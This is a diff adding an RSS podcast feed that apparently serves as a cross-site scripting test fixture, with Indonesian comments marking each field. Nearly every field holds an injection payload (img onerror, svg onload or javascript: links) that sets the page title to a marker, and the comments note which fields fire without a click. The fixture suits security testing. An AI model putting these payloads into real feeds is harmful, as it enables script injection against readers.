@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+     xmlns:content="http://purl.org/rss/1.0/modules/content/"
+     xmlns:atom="http://www.w3.org/2005/Atom"
+     xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+<channel>
+  <atom:link href="https://example.com/feed.xml" rel="self" type="application/rss+xml"/>
+
+  <!-- [1] CHANNEL TITLE : auto-fire img handler.
+       Kalau ada sink innerHTML, ini nyala TANPA klik. -->
+  <title><![CDATA[ZZFeed <img src=x onerror="document.title='X1_chanTitle'">]]></title>
+
+  <!-- [2] CHANNEL DESCRIPTION : auto-fire -->
+  <description><![CDATA[<img src=x onerror="document.title='X2_chanDesc'"> desc channel]]></description>
+
+  <!-- [3] CHANNEL LINK : javascript: scheme (butuh klik) -->
+  <link>javascript:document.title='X3_chanLink'</link>
+
+  <language>en</language>
+  <copyright>CC</copyright>
+
+  <!-- [4][5] IMAGE block -->
+  <image>
+    <url>javascript:document.title='X4_imgUrl'</url>
+    <title><![CDATA[<img src=x onerror="document.title='X5_imgTitle'">]]></title>
+    <link>javascript:document.title='X5b_imgLink'</link>
+  </image>
+
+  <item>
+    <!-- [6] ITEM TITLE : yang tadi kamu tes (React -> text node, aman) -->
+    <title><![CDATA[ZZItem <img src=x onerror="document.title='X6_itemTitle'">]]></title>
+
+    <pubDate>Fri, 15 Jan 2016 15:00:00 +0000</pubDate>
+    <guid isPermaLink="false">zz-item-0001</guid>
+
+    <!-- [7] ITEM LINK : javascript: scheme (butuh klik). Ganti juga ke "#" jika perlu -->
+    <link>javascript:document.title='X7_itemLink'</link>
+
+    <!-- [8] ITEM DESCRIPTION : auto-fire. Ini tersangka sink utama (dangerouslySetInnerHTML) -->
+    <description><![CDATA[<img src=x onerror="document.title='X8_itemDesc'"><svg onload="document.title='X8b_itemDescSvg'"></svg>]]></description>
+
+    <!-- [9] content:encoded : varian sink lain -->
+    <content:encoded><![CDATA[<img src=x onerror="document.title='X9_itemContent'">]]></content:encoded>
+
+    <!-- [10] enclosure url : javascript: (kadang jadi <img src=...>) -->
+    <enclosure length="1" type="audio/mpeg" url="javascript:document.title='X10_enclosure'"/>
+
+    <itunes:image href="javascript:document.title='X11_itunesImg'"/>
+    <itunes:summary><![CDATA[<img src=x onerror="document.title='X12_itunesSum'">]]></itunes:summary>
+  </item>
+</channel>
+</rss>
